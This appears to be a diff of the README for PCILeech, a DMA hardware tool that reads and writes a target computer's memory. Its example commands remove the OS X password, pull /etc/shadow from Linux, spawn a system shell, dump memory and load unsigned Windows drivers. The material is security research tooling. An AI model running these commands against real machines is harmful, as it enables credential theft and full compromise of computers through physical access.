@@ -30,14 +30,14 @@ In order to turn the USB3380 development board into a PCILeech device it needs t
 
 NB! If flashing the PP3380 PCIe card the J3 jumper must be bridged to connect the EEPROM. This is not necessary for the USB3380-EVB mini-PCIe card.
 
-* cd /pathtofiles
-* make
+* ` cd /pathtofiles `
+* ` make `
 * [ insert USB3380 hardware into computer ]
-* insmod pcileech_flash.ko
+* ` insmod pcileech_flash.ko `
 
-The insmod command must be run as root. If compilation fails you might have to install dependencies before you try again. On debian based systems - such as debian, ubuntu and kali, run 'apt-get update && apt-get install gcc make linux-headers-$(uname -r)' and try again.
+The insmod command must be run as root. If compilation fails you might have to install dependencies before you try again. On debian based systems - such as debian, ubuntu and kali, run ` apt-get update && apt-get install gcc make linux-headers-$(uname -r) ` and try again.
 
-If module insertion is successful flashing is also successful. In order to activate the flashed PCILeech device it must be power-cycled. Re-inserting it in the computer will achieve this. If one wish to flash more devices then unload the pcileech_flash kernel module by issuing the command: 'rmmod pcileech_flash'. If there is an error flashing is unsuccessful. Please try again and check any debug error messages by issing the command: 'dmsg'.
+If module insertion is successful flashing is also successful. In order to activate the flashed PCILeech device it must be power-cycled. Re-inserting it in the computer will achieve this. If one wish to flash more devices then unload the pcileech_flash kernel module by issuing the command: ` rmmod pcileech_flash `. If there is an error flashing is unsuccessful. Please try again and check any debug error messages by issing the command: ` dmsg `.
 
 Installing PCILeech:
 ====================
@@ -49,7 +49,7 @@ The Google Android USB driver also needs to be installed. Download the Google An
 
 Generating Signatures:
 ======================
-PCILeech comes with built in signatures for Linux and OS X. For Windows 8.1 and higher two full pages of driver code is needed to hijack the kernel. In order to avoid copyright issues the end user has to generate these signatures by themselves using the pcileech_gensig.exe program. The user needs to point to a valid ntfs.sys file in order to generate a signature.
+PCILeech comes with built in signatures for Linux and OS X. For Windows 8.1 and higher two full pages of driver code is needed to hijack the kernel. In order to avoid copyright issues the end user has to generate these signatures by themselves using the pcileech_gensig.exe program. The user needs to point to a valid ntfs.sys file in order to generate a signature. Alternatively it is possible to use the unstable/experimental win10_x64 generic built-in signature.
 
 Capabilities:
 =============
@@ -69,7 +69,7 @@ Users should be able to extend PCILeech easily by writing own kernel shellcode m
 Limitations/Known Issues:
 =========================
 * Read and write errors on some older hardware. Try "pcileech.exe testmemreadwrite -min 0x1000" in order to test memory reads and writes against the physical address 0x1000 (or any other address) in order to confirm.
-* Does not work if the OS uses the IOMMU/VT-d. This is the default on OS X (unless disabled in recovery mode). Windows 10 Enterprise with Virtuallization based security features enabled does not work - this is however not the default setting in Windows 10.
+* Does not work if the OS uses the IOMMU/VT-d. This is the default on OS X (unless disabled in recovery mode). Windows 10 Enterprise with Virtuallization based security features enabled does not work fully - this is however not the default setting in Windows 10.
 * Some Linux kernels does not work. Sometimes a required symbol is not exported in the kernel and PCILeech fails.
 * Linux might also not work if some virtualization based features are enabled.
 * Windows Vista: some shellcode modules such as wx64_pscmd does not work.
@@ -78,25 +78,34 @@ Limitations/Known Issues:
 Examples:
 =========
 Load OS X kernel module:
-* pcileech.exe kmdload -kmd osx_x64
+* ` pcileech.exe kmdload -kmd osx_x64 `
 
 Remove OS X password requirement, requires that the KMD is loaded at an address. In this example 0x11abc000 is used.
-* pcileech.exe ax64_unlock -kmd 0x11abc000 -0 1
+* ` pcileech.exe ax64_unlock -kmd 0x11abc000 -0 1 `
 
 Retrieve the file /etc/shadow from a Linux system without pre-loading a KMD.
-* pcileech.exe lx64_filepull -kmd LINUX_X64 -s /etc/shadow -out c:\temp\shadow
+* ` pcileech.exe lx64_filepull -kmd LINUX_X64 -s /etc/shadow -out c:\temp\shadow `
+
+Show help for the lx64_filepull kernel implant.
+* ` pcileech.exe lx64_filepull -help `
 
 Load a kernel module into Windows Vista by using the default memory scan technique.
-* pcileech.exe kmdload -kmd winvistax64
+* ` pcileech.exe kmdload -kmd winvistax64 `
 
 Load a kernel module into Windows 10 by targeting the page table of the ntfs.sys driver signed on 2016-03-29.
-* pcileech.exe kmdload -kmd win10x64_ntfs_20160329 -pt
+* ` pcileech.exe kmdload -kmd win10x64_ntfs_20160329 -pt `
+
+Load a kernel module into Windows 10 (unstable/experimental). Compatible with VBS/VTL0 only if "Protection of Code Integrity" is not enabled.
+* ` pcileech.exe kmdload -kmd WIN10_X64 `
 
 Spawn a system shell on the target system (system needs to be locked and kernel module must be loaded). In this example the kernel module is loaded at address: 0x7fffe000.
-* pcileech.exe wx64_pscmd -kmd 0x7fffe000
+* ` pcileech.exe wx64_pscmd -kmd 0x7fffe000 `
+
+Show help for the dump command.
+* ` pcileech.exe dump -help `
 
 Dump all memory from the target system given that a kernel module is loaded at address: 0x7fffe000.
-* pcileech.exe dump -kmd 0x7fffe000
+* ` pcileech.exe dump -kmd 0x7fffe000 `
 
 Building:
 =========
@@ -107,8 +116,13 @@ Changelog:
 v1.0
 * Initial release.
 
-latest
-* New implant: load unsigned drivers into Windows kernel [wx64_driverload_svc].
-* Added firmware flash support without PLX SDK.
-* Added linux unlock signatures.
-* New kernel module signature [win10x64_ntfs_20160820].
+v1.1
+* core: help for actions and kernel implants.
+* core: search for signatures (do not patch).
+* core: signature support for wildcard and relative offsets in addition to fixed offsets.
+* implant: load unsigned drivers into Windows kernel [wx64_driverload_svc].
+* signature: generic Windows 10 (Unstable/Experimental) [win10_x64].
+* signature: Windows 10 updated.
+* signature: Linux unlock added.
+* other: firmware flash support without PLX SDK.
+* other: various bug fixes.
